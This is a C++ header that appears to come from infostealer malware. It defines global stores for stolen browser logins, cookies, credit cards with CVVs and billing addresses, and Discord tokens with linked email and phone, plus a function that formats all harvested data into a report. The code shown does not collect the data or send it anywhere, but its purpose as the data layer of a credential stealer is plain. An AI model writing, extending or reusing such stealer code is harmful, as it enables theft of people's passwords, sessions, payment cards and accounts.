#pragma once


struct Login {
    std::string website;
    std::string username;
    std::string password;
};
inline std::vector<Login> logins;

struct Cookie {
    std::string host;
    std::string name;
    std::string value;
};
inline std::vector<Cookie> cookies;

struct CreditCard {
    std::string guid;
    std::string name;
    std::string expiration;
    std::string number;
    std::string cvv;
    std::string city;
    std::string state;
    std::string zip;
    std::string country;
    std::string street;
};
inline std::vector<CreditCard> cards;

struct DiscordToken {
    std::string token;
    std::string email;
    std::string phone;
    std::string username;
    bool nitro = false;
    DiscordToken(std::string t) : token(std::move(t)) {}
};
inline std::vector<DiscordToken> discord_tokens;

inline void append_discord_token(const std::string& token) {
    for (const auto& t : discord_tokens)
        if (t.token == token) return;
    discord_tokens.emplace_back(token);
}


inline std::mutex extra_info_mutex;
inline std::stringstream extra_info;

inline void append_extra_info(const std::string& line) {
    std::lock_guard<std::mutex> lock(extra_info_mutex);
    extra_info << line << "\n";
}

inline std::string dump_results() {
    std::stringstream ss;

    ss << "=== Logins (" << logins.size() << ") ===\n";
    for (const auto& login : logins) {
        ss << "  " << login.website << "\n";
        ss << "    Username: " << login.username << "\n";
        ss << "    Password: " << login.password << "\n";
    }

    ss << "\n=== Cookies (" << cookies.size() << ") ===\n";
    for (const auto& cookie : cookies) {
        ss << "  " << cookie.host << " - " << cookie.name << ": " << cookie.value << "\n";
    }

    ss << "\n=== Credit Cards (" << cards.size() << ") ===\n";
    for (const auto& card : cards) {
        ss << "  " << card.name << "\n";
        ss << "    Expiration: " << card.expiration << "\n";
        ss << "    Number: " << card.number << "\n";
        if (!card.cvv.empty())     ss << "    CVV: " << card.cvv << "\n";
        if (!card.city.empty())    ss << "    City: " << card.city << "\n";
        if (!card.state.empty())   ss << "    State: " << card.state << "\n";
        if (!card.zip.empty())     ss << "    Zip: " << card.zip << "\n";
        if (!card.country.empty()) ss << "    Country: " << card.country << "\n";
        if (!card.street.empty())  ss << "    Street: " << card.street << "\n";
    }

    ss << "\n=== Discord Tokens (" << discord_tokens.size() << ") ===\n";
    for (const auto& token : discord_tokens) {
        ss << "  " << token.token << "\n";
        ss << "    Email: " << token.email << "\n";
        ss << "    Phone: " << token.phone << "\n";
        ss << "    Username: " << token.username << "\n";
        ss << "    Nitro: " << (token.nitro ? "Yes" : "No") << "\n";
    }

    {
        std::lock_guard<std::mutex> lock(extra_info_mutex);
        std::string extra = extra_info.str();
        if (!extra.empty()) {
            ss << "\n=== Additional Info ===\n" << extra;
        }
    }

    return ss.str();
}
